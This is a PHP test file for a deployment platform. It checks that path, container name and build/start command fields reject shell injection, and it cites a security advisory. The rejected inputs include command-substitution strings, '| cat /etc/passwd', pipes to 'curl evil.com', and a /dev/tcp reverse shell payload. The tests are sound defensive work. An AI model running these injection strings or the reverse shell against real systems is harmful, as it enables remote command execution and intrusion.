<?php

use App\Jobs\ApplicationDeploymentJob;
use App\Support\ValidationPatterns;

describe('deployment job path field validation', function () {
    test('rejects shell metacharacters in dockerfile_location', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, '/Dockerfile; echo pwned', 'dockerfile_location'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');
    });

    test('rejects backtick injection', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, '/Dockerfile`whoami`', 'dockerfile_location'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');
    });

    test('rejects dollar sign variable expansion', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, '/Dockerfile$(whoami)', 'dockerfile_location'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');
    });

    test('rejects pipe injection', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, '/Dockerfile | cat /etc/passwd', 'dockerfile_location'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');
    });

    test('rejects ampersand injection', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, '/Dockerfile && env', 'dockerfile_location'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');
    });

    test('rejects path traversal', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, '/../../../etc/passwd', 'dockerfile_location'))
            ->toThrow(RuntimeException::class, 'path traversal detected');
    });

    test('allows valid simple path', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect($method->invoke($instance, '/Dockerfile', 'dockerfile_location'))
            ->toBe('/Dockerfile');
    });

    test('allows valid nested path with dots and hyphens', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect($method->invoke($instance, '/docker/Dockerfile.prod', 'dockerfile_location'))
            ->toBe('/docker/Dockerfile.prod');
    });

    test('allows path with @ symbol for scoped packages', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect($method->invoke($instance, '/packages/@intlayer/mcp/Dockerfile', 'dockerfile_location'))
            ->toBe('/packages/@intlayer/mcp/Dockerfile');
    });

    test('allows path with tilde and plus characters', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect($method->invoke($instance, '/build~v1/c++/Dockerfile', 'dockerfile_location'))
            ->toBe('/build~v1/c++/Dockerfile');
    });

    test('allows valid compose file path', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect($method->invoke($instance, '/docker-compose.prod.yml', 'docker_compose_location'))
            ->toBe('/docker-compose.prod.yml');
    });
});

describe('API validation rules for path fields', function () {
    test('dockerfile_location validation rejects shell metacharacters', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_location' => '/Dockerfile; echo pwned; #'],
            ['dockerfile_location' => $rules['dockerfile_location']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('dockerfile_location validation allows valid paths', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_location' => '/docker/Dockerfile.prod'],
            ['dockerfile_location' => $rules['dockerfile_location']]
        );

        expect($validator->fails())->toBeFalse();
    });

    test('docker_compose_location validation rejects shell metacharacters', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_location' => '/docker-compose.yml; env; #'],
            ['docker_compose_location' => $rules['docker_compose_location']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('docker_compose_location validation allows valid paths', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_location' => '/docker/docker-compose.prod.yml'],
            ['docker_compose_location' => $rules['docker_compose_location']]
        );

        expect($validator->fails())->toBeFalse();
    });

    test('dockerfile_location validation allows paths with @ for scoped packages', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_location' => '/packages/@intlayer/mcp/Dockerfile'],
            ['dockerfile_location' => $rules['dockerfile_location']]
        );

        expect($validator->fails())->toBeFalse();
    });
});

describe('sharedDataApplications rules survive array_merge in controller', function () {
    test('docker_compose_location safe regex is not overridden by local rules', function () {
        $sharedRules = sharedDataApplications();

        // Simulate what ApplicationsController does: array_merge(shared, local)
        // After our fix, local no longer contains docker_compose_location,
        // so the shared regex rule must survive
        $localRules = [
            'name' => 'string|max:255',
            'docker_compose_domains' => 'array|nullable',
        ];
        $merged = array_merge($sharedRules, $localRules);

        // The merged rules for docker_compose_location should be the safe regex, not just 'string'
        expect($merged['docker_compose_location'])->toBeArray();
        expect($merged['docker_compose_location'])->toContain('regex:'.ValidationPatterns::FILE_PATH_PATTERN);
    });
});

describe('path fields require leading slash', function () {
    test('dockerfile_location without leading slash is rejected by API rules', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_location' => 'Dockerfile'],
            ['dockerfile_location' => $rules['dockerfile_location']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('docker_compose_location without leading slash is rejected by API rules', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_location' => 'docker-compose.yaml'],
            ['docker_compose_location' => $rules['docker_compose_location']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('deployment job rejects path without leading slash', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, 'docker-compose.yaml', 'docker_compose_location'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');
    });
});

describe('dockerfile_target_build validation', function () {
    test('rejects shell metacharacters in dockerfile_target_build', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_target_build' => 'production; echo pwned'],
            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects command substitution in dockerfile_target_build', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_target_build' => 'builder$(whoami)'],
            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects ampersand injection in dockerfile_target_build', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_target_build' => 'stage && env'],
            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows valid target names', function ($target) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['dockerfile_target_build' => $target],
            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
        );

        expect($validator->fails())->toBeFalse();
    })->with(['production', 'build-stage', 'stage.final', 'my_target', 'v2']);

    test('runtime validates dockerfile_target_build', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);

        // Test that validateShellSafeCommand is also available as a pattern
        $pattern = ValidationPatterns::DOCKER_TARGET_PATTERN;
        expect(preg_match($pattern, 'production'))->toBe(1);
        expect(preg_match($pattern, 'build; env'))->toBe(0);
        expect(preg_match($pattern, 'target`whoami`'))->toBe(0);
    });
});

describe('base_directory validation', function () {
    test('rejects shell metacharacters in base_directory', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['base_directory' => '/src; echo pwned'],
            ['base_directory' => $rules['base_directory']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects command substitution in base_directory', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['base_directory' => '/dir$(whoami)'],
            ['base_directory' => $rules['base_directory']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows valid base directories', function ($dir) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['base_directory' => $dir],
            ['base_directory' => $rules['base_directory']]
        );

        expect($validator->fails())->toBeFalse();
    })->with(['/', '/src', '/backend/app', '/packages/@scope/app']);

    test('runtime validates base_directory via validatePathField', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validatePathField');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, '/src; echo pwned', 'base_directory'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');

        expect($method->invoke($instance, '/src', 'base_directory'))
            ->toBe('/src');
    });
});

describe('docker_compose_custom_command validation', function () {
    test('rejects semicolon injection in docker_compose_custom_start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_start_command' => 'docker compose up; echo pwned'],
            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects pipe injection in docker_compose_custom_build_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_build_command' => 'docker compose build | curl evil.com'],
            ['docker_compose_custom_build_command' => $rules['docker_compose_custom_build_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows ampersand chaining in docker_compose_custom_start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_start_command' => 'docker compose up && docker compose logs'],
            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
        );

        expect($validator->fails())->toBeFalse();
    });

    test('rejects command substitution in docker_compose_custom_build_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_build_command' => 'docker compose build $(whoami)'],
            ['docker_compose_custom_build_command' => $rules['docker_compose_custom_build_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows valid docker compose commands', function ($cmd) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_start_command' => $cmd],
            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
        );

        expect($validator->fails())->toBeFalse();
    })->with([
        'docker compose build',
        'docker compose up -d --build',
        'docker compose -f custom.yml build --no-cache',
        'docker compose build && docker tag registry.example.com/app:beta localhost:5000/app:beta && docker push localhost:5000/app:beta',
    ]);

    test('rejects backslash in docker_compose_custom_start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_start_command' => 'docker compose up \\n curl evil.com'],
            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects single quotes in docker_compose_custom_start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_start_command' => "docker compose up -d --build 'malicious'"],
            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows double quotes in docker_compose_custom_start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_start_command' => 'docker compose up -d --build --build-arg VERSION="1.0.0"'],
            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
        );

        expect($validator->fails())->toBeFalse();
    });

    test('rejects newline injection in docker_compose_custom_start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_start_command' => "docker compose up\ncurl evil.com"],
            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects carriage return injection in docker_compose_custom_build_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['docker_compose_custom_build_command' => "docker compose build\rcurl evil.com"],
            ['docker_compose_custom_build_command' => $rules['docker_compose_custom_build_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('runtime validates docker compose commands', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validateShellSafeCommand');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, 'docker compose up; echo pwned', 'docker_compose_custom_start_command'))
            ->toThrow(RuntimeException::class, 'contains forbidden shell characters');

        expect(fn () => $method->invoke($instance, "docker compose up\ncurl evil.com", 'docker_compose_custom_start_command'))
            ->toThrow(RuntimeException::class, 'contains forbidden shell characters');

        expect($method->invoke($instance, 'docker compose up -d --build', 'docker_compose_custom_start_command'))
            ->toBe('docker compose up -d --build');
    });
});

describe('custom_docker_run_options validation', function () {
    test('rejects semicolon injection in custom_docker_run_options', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['custom_docker_run_options' => '--cap-add=NET_ADMIN; echo pwned'],
            ['custom_docker_run_options' => $rules['custom_docker_run_options']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects command substitution in custom_docker_run_options', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['custom_docker_run_options' => '--hostname=$(whoami)'],
            ['custom_docker_run_options' => $rules['custom_docker_run_options']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows valid docker run options', function ($opts) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['custom_docker_run_options' => $opts],
            ['custom_docker_run_options' => $rules['custom_docker_run_options']]
        );

        expect($validator->fails())->toBeFalse();
    })->with([
        '--cap-add=NET_ADMIN --cap-add=NET_RAW',
        '--privileged --init',
        '--memory=512m --cpus=2',
        '--entrypoint "sh -c \'npm start\'"',
        '--entrypoint "sh -c \'php artisan schedule:work\'"',
        '--hostname "my-host"',
    ]);
});

describe('container name validation', function () {
    test('rejects shell injection in container name', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['post_deployment_command_container' => 'my-container; echo pwned'],
            ['post_deployment_command_container' => $rules['post_deployment_command_container']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows valid container names', function ($name) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['post_deployment_command_container' => $name],
            ['post_deployment_command_container' => $rules['post_deployment_command_container']]
        );

        expect($validator->fails())->toBeFalse();
    })->with(['my-app', 'nginx_proxy', 'web.server', 'app123']);

    test('runtime validates container names', function () {
        $job = new ReflectionClass(ApplicationDeploymentJob::class);
        $method = $job->getMethod('validateContainerName');
        $method->setAccessible(true);

        $instance = $job->newInstanceWithoutConstructor();

        expect(fn () => $method->invoke($instance, 'container; echo pwned'))
            ->toThrow(RuntimeException::class, 'contains forbidden characters');

        expect($method->invoke($instance, 'my-app'))
            ->toBe('my-app');
    });
});

describe('dockerfile_target_build rules survive array_merge in controller', function () {
    test('dockerfile_target_build safe regex is not overridden by local rules', function () {
        $sharedRules = sharedDataApplications();

        // Simulate what ApplicationsController does: array_merge(shared, local)
        $localRules = [
            'name' => 'string|max:255',
            'docker_compose_domains' => 'array|nullable',
        ];
        $merged = array_merge($sharedRules, $localRules);

        expect($merged)->toHaveKey('dockerfile_target_build');
        expect($merged['dockerfile_target_build'])->toBeArray();
        expect($merged['dockerfile_target_build'])->toContain('regex:'.ValidationPatterns::DOCKER_TARGET_PATTERN);
    });
});

describe('docker_compose_custom_command rules survive array_merge in controller', function () {
    test('docker_compose_custom_start_command safe regex is not overridden by local rules', function () {
        $sharedRules = sharedDataApplications();

        // Simulate what ApplicationsController does: array_merge(shared, local)
        // After our fix, local no longer contains docker_compose_custom_start_command,
        // so the shared regex rule must survive
        $localRules = [
            'name' => 'string|max:255',
            'docker_compose_domains' => 'array|nullable',
        ];
        $merged = array_merge($sharedRules, $localRules);

        expect($merged['docker_compose_custom_start_command'])->toBeArray();
        expect($merged['docker_compose_custom_start_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
    });

    test('docker_compose_custom_build_command safe regex is not overridden by local rules', function () {
        $sharedRules = sharedDataApplications();

        $localRules = [
            'name' => 'string|max:255',
            'docker_compose_domains' => 'array|nullable',
        ];
        $merged = array_merge($sharedRules, $localRules);

        expect($merged['docker_compose_custom_build_command'])->toBeArray();
        expect($merged['docker_compose_custom_build_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
    });
});

describe('API route middleware for deploy actions', function () {
    test('application start route requires deploy ability', function () {
        $routes = app('router')->getRoutes();
        $route = $routes->getByAction('App\Http\Controllers\Api\ApplicationsController@action_deploy');

        expect($route)->not->toBeNull();
        $middleware = $route->gatherMiddleware();
        expect($middleware)->toContain('api.ability:deploy');
        expect($middleware)->not->toContain('api.ability:write');
    });

    test('application restart route requires deploy ability', function () {
        $routes = app('router')->getRoutes();
        $matchedRoute = null;
        foreach ($routes as $route) {
            if (str_contains($route->uri(), 'applications') && str_contains($route->uri(), 'restart')) {
                $matchedRoute = $route;
                break;
            }
        }

        expect($matchedRoute)->not->toBeNull();
        $middleware = $matchedRoute->gatherMiddleware();
        expect($middleware)->toContain('api.ability:deploy');
    });

    test('application stop route requires deploy ability', function () {
        $routes = app('router')->getRoutes();
        $matchedRoute = null;
        foreach ($routes as $route) {
            if (str_contains($route->uri(), 'applications') && str_contains($route->uri(), 'stop')) {
                $matchedRoute = $route;
                break;
            }
        }

        expect($matchedRoute)->not->toBeNull();
        $middleware = $matchedRoute->gatherMiddleware();
        expect($middleware)->toContain('api.ability:deploy');
    });

    test('database start route requires deploy ability', function () {
        $routes = app('router')->getRoutes();
        $matchedRoute = null;
        foreach ($routes as $route) {
            if (str_contains($route->uri(), 'databases') && str_contains($route->uri(), 'start')) {
                $matchedRoute = $route;
                break;
            }
        }

        expect($matchedRoute)->not->toBeNull();
        $middleware = $matchedRoute->gatherMiddleware();
        expect($middleware)->toContain('api.ability:deploy');
    });

    test('service start route requires deploy ability', function () {
        $routes = app('router')->getRoutes();
        $matchedRoute = null;
        foreach ($routes as $route) {
            if (str_contains($route->uri(), 'services') && str_contains($route->uri(), 'start')) {
                $matchedRoute = $route;
                break;
            }
        }

        expect($matchedRoute)->not->toBeNull();
        $middleware = $matchedRoute->gatherMiddleware();
        expect($middleware)->toContain('api.ability:deploy');
    });
});

describe('install/build/start command validation (GHSA-9pp4-wcmj-rq73)', function () {
    test('rejects semicolon injection in install_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['install_command' => 'npm install; curl evil.com'],
            ['install_command' => $rules['install_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects pipe injection in build_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['build_command' => 'npm run build | curl evil.com'],
            ['build_command' => $rules['build_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects command substitution in start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['start_command' => 'npm start $(whoami)'],
            ['start_command' => $rules['start_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects backtick injection in install_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['install_command' => 'npm install `whoami`'],
            ['install_command' => $rules['install_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects dollar sign in build_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['build_command' => 'npm run build $HOME'],
            ['build_command' => $rules['build_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects reverse shell payload in install_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['install_command' => '"; bash -i >& /dev/tcp/172.23.0.1/1337 0>&1; #'],
            ['install_command' => $rules['install_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('rejects newline injection in start_command', function () {
        $rules = sharedDataApplications();

        $validator = validator(
            ['start_command' => "npm start\ncurl evil.com"],
            ['start_command' => $rules['start_command']]
        );

        expect($validator->fails())->toBeTrue();
    });

    test('allows valid install commands', function ($cmd) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['install_command' => $cmd],
            ['install_command' => $rules['install_command']]
        );

        expect($validator->fails())->toBeFalse();
    })->with([
        'npm install',
        'yarn install --frozen-lockfile',
        'pip install -r requirements.txt',
        'bun install',
        'pnpm install --no-frozen-lockfile',
    ]);

    test('allows valid build commands', function ($cmd) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['build_command' => $cmd],
            ['build_command' => $rules['build_command']]
        );

        expect($validator->fails())->toBeFalse();
    })->with([
        'npm run build',
        'cargo build --release',
        'go build -o main .',
        'yarn build && yarn postbuild',
        'make build',
    ]);

    test('allows valid start commands', function ($cmd) {
        $rules = sharedDataApplications();

        $validator = validator(
            ['start_command' => $cmd],
            ['start_command' => $rules['start_command']]
        );

        expect($validator->fails())->toBeFalse();
    })->with([
        'npm start',
        'node server.js',
        'python main.py',
        'java -jar app.jar',
        './start.sh',
    ]);

    test('allows null values for command fields', function ($field) {
        $rules = sharedDataApplications();

        $validator = validator(
            [$field => null],
            [$field => $rules[$field]]
        );

        expect($validator->fails())->toBeFalse();
    })->with(['install_command', 'build_command', 'start_command']);
});

describe('install/build/start command rules survive array_merge in controller', function () {
    test('install_command safe regex is not overridden by local rules', function () {
        $sharedRules = sharedDataApplications();

        $localRules = [
            'name' => 'string|max:255',
            'docker_compose_domains' => 'array|nullable',
        ];
        $merged = array_merge($sharedRules, $localRules);

        expect($merged['install_command'])->toBeArray();
        expect($merged['install_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
    });

    test('build_command safe regex is not overridden by local rules', function () {
        $sharedRules = sharedDataApplications();

        $localRules = [
            'name' => 'string|max:255',
            'docker_compose_domains' => 'array|nullable',
        ];
        $merged = array_merge($sharedRules, $localRules);

        expect($merged['build_command'])->toBeArray();
        expect($merged['build_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
    });

    test('start_command safe regex is not overridden by local rules', function () {
        $sharedRules = sharedDataApplications();

        $localRules = [
            'name' => 'string|max:255',
            'docker_compose_domains' => 'array|nullable',
        ];
        $merged = array_merge($sharedRules, $localRules);

        expect($merged['start_command'])->toBeArray();
        expect($merged['start_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
    });
});
